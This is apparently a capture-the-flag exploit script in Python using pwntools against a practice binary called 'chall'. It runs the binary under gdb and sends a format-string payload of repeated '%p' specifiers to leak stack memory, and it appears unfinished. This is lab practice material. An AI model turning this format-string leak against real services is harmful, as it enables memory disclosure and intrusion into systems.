from pwn import *
import struct
BINARY = ['./chall']
IP, PORT = 'ctf99.cs.ui.ac.id', 10009
LOCAL = True
DEBUG = True
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *vuln+59
        b *vuln+76
        b *vuln+81
        b *target+30
        b *target+37
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
if not LOCAL:
    print(p.recv())  # Weird behaviour from the server
given_address = p.recvline().decode().split(" ")[-1].strip()
print(f"given address is: {given_address}")

target = 0x00000000000008f0
not_flag = 0x555555601060

payload = b''
payload += b'%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'
print(f"Payload is: {payload}")
p.sendline(payload)
print(p.recv())
pause()


